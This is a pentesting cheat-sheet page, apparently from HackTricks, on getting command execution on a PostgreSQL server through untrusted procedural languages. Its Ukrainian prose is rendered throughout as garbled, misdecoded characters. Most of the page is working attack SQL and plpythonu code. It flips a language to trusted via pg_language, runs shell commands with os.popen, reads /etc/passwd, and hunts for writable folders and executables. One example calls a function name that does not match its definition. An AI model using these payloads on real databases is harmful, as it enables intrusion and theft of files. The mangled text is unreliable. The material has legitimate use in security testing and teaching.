# –í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è RCE –∑ –º–æ–≤–∞–º–∏ PostgreSQL

<details>

<summary><strong>–í–∏–≤—á–∞–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* –í–∏ –ø—Ä–∞—Ü—é—î—Ç–µ –≤ **–∫—ñ–±–µ—Ä–±–µ–∑–ø–µ—Ü—ñ –∫–æ–º–ø–∞–Ω—ñ—ó**? –•–æ—á–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ **—Ä–µ–∫–ª–∞–º—É –≤–∞—à–æ—ó –∫–æ–º–ø–∞–Ω—ñ—ó –Ω–∞ HackTricks**? –∞–±–æ —Ö–æ—á–µ—Ç–µ –º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ **–æ—Å—Ç–∞–Ω–Ω—å–æ—ó –≤–µ—Ä—Å—ñ—ó PEASS –∞–±–æ –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É PDF**? –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –î—ñ–∑–Ω–∞–π—Ç–µ—Å—è –ø—Ä–æ [**–°—ñ–º'—é PEASS**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü—ñ—é –µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–∏—Ö [**NFT**](https://opensea.io/collection/the-peass-family)
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** [**üí¨**](https://emojipedia.org/speech-balloon/) [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ Telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –º–Ω–æ—é –Ω–∞ **Twitter** üê¶[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Å–≤–æ—ó–º–∏ —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ PR –¥–æ** [**—Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—é hacktricks**](https://github.com/carlospolop/hacktricks) **—Ç–∞** [**—Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—é hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## –ú–æ–≤–∏ PostgreSQL

–£ –±–∞–∑—ñ –¥–∞–Ω–∏—Ö PostgreSQL, –¥–æ —è–∫–æ—ó –≤–∏ –º–∞—î—Ç–µ –¥–æ—Å—Ç—É–ø, –º–æ–∂—É—Ç—å –±—É—Ç–∏ –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω—ñ —Ä—ñ–∑–Ω—ñ **–º–æ–≤–∏ —Å—Ü–µ–Ω–∞—Ä—ñ—ó–≤**, —è–∫—ñ –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –¥–ª—è **–≤–∏–∫–æ–Ω–∞–Ω–Ω—è –¥–æ–≤—ñ–ª—å–Ω–æ–≥–æ –∫–æ–¥—É**.

–í–∏ –º–æ–∂–µ—Ç–µ **–∑–∞–ø—É—Å—Ç–∏—Ç–∏ —ó—Ö**:
```sql
\dL *

SELECT lanname,lanpltrusted,lanacl FROM pg_language;
```
–ë—ñ–ª—å—à—ñ—Å—Ç—å –º–æ–≤ —Å—Ü–µ–Ω–∞—Ä—ñ—ó–≤, —è–∫—ñ –º–æ–∂–Ω–∞ –≤—Å—Ç–∞–Ω–æ–≤–∏—Ç–∏ –≤ PostgreSQL, –º–∞—é—Ç—å **2 –≤–∞—Ä—ñ–∞–Ω—Ç–∏**: **–¥–æ–≤—ñ—Ä–µ–Ω–∏–π** —Ç–∞ **–Ω–µ–¥–æ–≤—ñ—Ä–µ–Ω–∏–π**. **–ù–µ–¥–æ–≤—ñ—Ä–µ–Ω–∏–π** –º–∞—Ç–∏–º–µ –Ω–∞–∑–≤—É, **–∑–∞–∫—ñ–Ω—á—É–≤–∞—Ç–∏–º–µ—Ç—å—Å—è –Ω–∞ "u"** —ñ –±—É–¥–µ –≤–µ—Ä—Å—ñ—î—é, —è–∫–∞ –¥–æ–∑–≤–æ–ª–∏—Ç—å –≤–∞–º **–≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏ –∫–æ–¥** —Ç–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —ñ–Ω—à—ñ —Ü—ñ–∫–∞–≤—ñ —Ñ—É–Ω–∫—Ü—ñ—ó. –û—Å—å –º–æ–≤–∏, —è–∫—ñ, —è–∫—â–æ –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω—ñ, —î —Ü—ñ–∫–∞–≤–∏–º–∏:

* **plpythonu**
* **plpython3u**
* **plperlu**
* **pljavaU**
* **plrubyu**
* ... (–±—É–¥—å-—è–∫–∞ —ñ–Ω—à–∞ –º–æ–≤–∞ –ø—Ä–æ–≥—Ä–∞–º—É–≤–∞–Ω–Ω—è, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –Ω–µ–Ω–∞–¥—ñ–π–Ω—É –≤–µ—Ä—Å—ñ—é)

{% hint style="warning" %}
–Ø–∫—â–æ –≤–∏ –≤–∏—è–≤–∏—Ç–µ, —â–æ —Ü—ñ–∫–∞–≤–∞ –º–æ–≤–∞ **–≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∞**, –∞–ª–µ **–Ω–µ–¥–æ–≤—ñ—Ä–µ–Ω–∞** PostgreSQL (**`lanpltrusted`** - **`false`**), –≤–∏ –º–æ–∂–µ—Ç–µ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ **–¥–æ–≤—ñ—Ä–∏—Ç–∏ —ó—ó** –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –Ω–∞—Å—Ç—É–ø–Ω–æ–≥–æ —Ä—è–¥–∫–∞, —â–æ–± PostgreSQL –Ω–µ –∑–∞—Å—Ç–æ—Å–æ–≤—É–≤–∞–ª–∞ –æ–±–º–µ–∂–µ–Ω–Ω—è:
```sql
UPDATE pg_language SET lanpltrusted=true WHERE lanname='plpythonu';
# To check your permissions over the table pg_language
SELECT * FROM information_schema.table_privileges WHERE table_name = 'pg_language';
```
{% endhint %}

{% hint style="danger" %}
–Ø–∫—â–æ –≤–∏ –Ω–µ –±–∞—á–∏—Ç–µ –º–æ–≤—É, –≤–∏ –º–æ–∂–µ—Ç–µ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ —ó—ó –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é (**–≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ –±—É—Ç–∏ —Å—É–ø–µ—Ä–∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–æ–º**):
```
CREATE EXTENSION plpythonu;
CREATE EXTENSION plpython3u;
CREATE EXTENSION plperlu;
CREATE EXTENSION pljavaU;
CREATE EXTENSION plrubyu;
```
{% endhint %}

–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ –º–æ–∂–ª–∏–≤–æ —Å–∫–æ–º–ø—ñ–ª—é–≤–∞—Ç–∏ –±–µ–∑–ø–µ—á–Ω—ñ –≤–µ—Ä—Å—ñ—ó —è–∫ "–Ω–µ–±–µ–∑–ø–µ—á–Ω—ñ". –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**—Ü–µ**](https://www.robbyonrails.com/articles/2005/08/22/installing-untrusted-pl-ruby-for-postgresql.html) –Ω–∞ –ø—Ä–∏–∫–ª–∞–¥—ñ. –¢–∞–∫ —â–æ –∑–∞–≤–∂–¥–∏ –≤–∞—Ä—Ç–æ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ –≤–∏–∫–æ–Ω–∞—Ç–∏ –∫–æ–¥, –Ω–∞–≤—ñ—Ç—å —è–∫—â–æ –≤–∏ –∑–Ω–∞–π—à–ª–∏ –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω—É **–¥–æ–≤—ñ—Ä–µ–Ω—É** –≤–µ—Ä—Å—ñ—é.

## plpythonu/plpython3u

{% tabs %}
{% tab title="RCE" %}
```sql
CREATE OR REPLACE FUNCTION exec (cmd text)
RETURNS VARCHAR(65535) stable
AS $$
import os
return os.popen(cmd).read()
#return os.execve(cmd, ["/usr/lib64/pgsql92/bin/psql"], {})
$$
LANGUAGE 'plpythonu';

SELECT cmd("ls"); #RCE with popen or execve
```
{% endtab %}

{% tab title="–û—Ç—Ä–∏–º–∞—Ç–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –û–°" %}
```sql
CREATE OR REPLACE FUNCTION get_user (pkg text)
RETURNS VARCHAR(65535) stable
AS $$
import os
return os.getlogin()
$$
LANGUAGE 'plpythonu';

SELECT get_user(""); #Get user, para is useless
```
{% endtab %}

{% tab title="–°–ø–∏—Å–æ–∫ –∫–∞—Ç–∞–ª–æ–≥—ñ–≤" %}
```sql
CREATE OR REPLACE FUNCTION lsdir (dir text)
RETURNS VARCHAR(65535) stable
AS $$
import json
from os import walk
files = next(walk(dir), (None, None, []))
return json.dumps({"root": files[0], "dirs": files[1], "files": files[2]})[:65535]
$$
LANGUAGE 'plpythonu';

SELECT lsdir("/"); #List dir
```
{% endtab %}

{% tab title="–ó–Ω–∞–π–¥—ñ—Ç—å –ø–∞–ø–∫—É W" %}
```sql
CREATE OR REPLACE FUNCTION findw (dir text)
RETURNS VARCHAR(65535) stable
AS $$
import os
def my_find(path):
writables = []
def find_writable(path):
if not os.path.isdir(path):
return
if os.access(path, os.W_OK):
writables.append(path)
if not os.listdir(path):
return
else:
for item in os.listdir(path):
find_writable(os.path.join(path, item))
find_writable(path)
return writables

return ", ".join(my_find(dir))
$$
LANGUAGE 'plpythonu';

SELECT findw("/"); #Find Writable folders from a folder (recursively)
```
{% endtab %}

{% tab title="–ó–Ω–∞–π–¥—ñ—Ç—å —Ñ–∞–π–ª" %}
```sql
CREATE OR REPLACE FUNCTION find_file (exe_sea text)
RETURNS VARCHAR(65535) stable
AS $$
import os
def my_find(path):
executables = []
def find_executables(path):
if not os.path.isdir(path):
executables.append(path)

if os.path.isdir(path):
if not os.listdir(path):
return
else:
for item in os.listdir(path):
find_executables(os.path.join(path, item))
find_executables(path)
return executables

a = my_find("/")
b = []

for i in a:
if exe_sea in os.path.basename(i):
b.append(i)
return ", ".join(b)
$$
LANGUAGE 'plpythonu';

SELECT find_file("psql"); #Find a file
```
{% endtab %}

{% tab title="–ó–Ω–∞–π–¥—ñ—Ç—å –≤–∏–∫–æ–Ω–∞–≤—á—ñ —Ñ–∞–π–ª–∏" %}
```sql
CREATE OR REPLACE FUNCTION findx (dir text)
RETURNS VARCHAR(65535) stable
AS $$
import os
def my_find(path):
executables = []
def find_executables(path):
if not os.path.isdir(path) and os.access(path, os.X_OK):
executables.append(path)

if os.path.isdir(path):
if not os.listdir(path):
return
else:
for item in os.listdir(path):
find_executables(os.path.join(path, item))
find_executables(path)
return executables

a = my_find(dir)
b = []

for i in a:
b.append(os.path.basename(i))
return ", ".join(b)
$$
LANGUAGE 'plpythonu';

SELECT findx("/"); #Find an executables in folder (recursively)
```
{% endtab %}

{% tab title="–ó–Ω–∞–π–¥—ñ—Ç—å –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –ø—ñ–¥–ø–∏—Å—ñ–≤" %}
```sql
CREATE OR REPLACE FUNCTION find_exe (exe_sea text)
RETURNS VARCHAR(65535) stable
AS $$
import os
def my_find(path):
executables = []
def find_executables(path):
if not os.path.isdir(path) and os.access(path, os.X_OK):
executables.append(path)

if os.path.isdir(path):
if not os.listdir(path):
return
else:
for item in os.listdir(path):
find_executables(os.path.join(path, item))
find_executables(path)
return executables

a = my_find("/")
b = []

for i in a:
if exe_sea in i:
b.append(i)
return ", ".join(b)
$$
LANGUAGE 'plpythonu';

SELECT find_exe("psql"); #Find executable by susbstring
```
{% endtab %}

{% tab title="–ß–∏—Ç–∞—Ç–∏" %}
```sql
CREATE OR REPLACE FUNCTION read (path text)
RETURNS VARCHAR(65535) stable
AS $$
import base64
encoded_string= base64.b64encode(open(path).read())
return encoded_string.decode('utf-8')
return open(path).read()
$$
LANGUAGE 'plpythonu';

select read('/etc/passwd'); #Read a file in b64
```
{% endtab %}

{% tab title="–û—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ–∑–≤–æ–ª–∏" %}
```sql
CREATE OR REPLACE FUNCTION get_perms (path text)
RETURNS VARCHAR(65535) stable
AS $$
import os
status = os.stat(path)
perms = oct(status.st_mode)[-3:]
return str(perms)
$$
LANGUAGE 'plpythonu';

select get_perms("/etc/passwd"); # Get perms of file
```
{% endtab %}

{% tab title="–ó–∞–ø–∏—Ç" %}
```sql
CREATE OR REPLACE FUNCTION req2 (url text)
RETURNS VARCHAR(65535) stable
AS $$
import urllib
r = urllib.urlopen(url)
return r.read()
$$
LANGUAGE 'plpythonu';

SELECT req2('https://google.com'); #Request using python2

CREATE OR REPLACE FUNCTION req3 (url text)
RETURNS VARCHAR(65535) stable
AS $$
from urllib import request
r = request.urlopen(url)
return r.read()
$$
LANGUAGE 'plpythonu';

SELECT req3('https://google.com'); #Request using python3
```
## pgSQL

–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ –Ω–∞—Å—Ç—É–ø–Ω—É —Å—Ç–æ—Ä—ñ–Ω–∫—É:

{% content-ref url="pl-pgsql-password-bruteforce.md" %}
[pl-pgsql-password-bruteforce.md](pl-pgsql-password-bruteforce.md)
{% endcontent-ref %}

## C

–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ –Ω–∞—Å—Ç—É–ø–Ω—É —Å—Ç–æ—Ä—ñ–Ω–∫—É:

{% content-ref url="rce-with-postgresql-extensions.md" %}
[rce-with-postgresql-extensions.md](rce-with-postgresql-extensions.md)
{% endcontent-ref %}

<details>

<summary><strong>–í–∏–≤—á–∞–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* –í–∏ –ø—Ä–∞—Ü—é—î—Ç–µ –≤ **–∫—ñ–±–µ—Ä–±–µ–∑–ø–µ—Ü—ñ–≤—ñ–π –∫–æ–º–ø–∞–Ω—ñ—ó**? –•–æ—á–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ –≤–∞—à—É **–∫–æ–º–ø–∞–Ω—ñ—é –≤ —Ä–µ–∫–ª–∞–º—ñ –Ω–∞ HackTricks**? –∞–±–æ —Ö–æ—á–µ—Ç–µ –º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ **–æ—Å—Ç–∞–Ω–Ω—å–æ—ó –≤–µ—Ä—Å—ñ—ó PEASS –∞–±–æ –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É PDF**? –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –í—ñ–¥–∫—Ä–∏–π—Ç–µ –¥–ª—è —Å–µ–±–µ [**–°—ñ–º'—é PEASS**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü—ñ—é –µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–∏—Ö [**NFT**](https://opensea.io/collection/the-peass-family)
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** [**üí¨**](https://emojipedia.org/speech-balloon/) [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ Telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –º–Ω–æ—é –Ω–∞ **Twitter** üê¶[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Å–≤–æ—ó–º–∏ —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ PR –¥–æ** [**—Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—é hacktricks**](https://github.com/carlospolop/hacktricks) **—ñ** [**—Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—é hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
